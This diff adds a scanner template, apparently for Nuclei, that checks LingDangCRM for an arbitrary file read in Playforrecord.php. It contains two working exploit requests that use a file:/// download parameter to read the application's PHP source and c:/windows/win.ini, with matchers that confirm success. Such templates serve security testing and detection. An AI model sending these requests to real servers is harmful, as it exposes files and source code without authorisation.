@@ -1,0 +1,31 @@
+id: LingDangCRM-Playforrecord-ReadAnyFile
+
+info:
+  name: LingDangCRM-Playforrecord-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    LingDangCRM-Playforrecord-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /crm/modules/Accounts/Playforrecord.php?download=file:///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[fonts]"
+          - "<?php"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
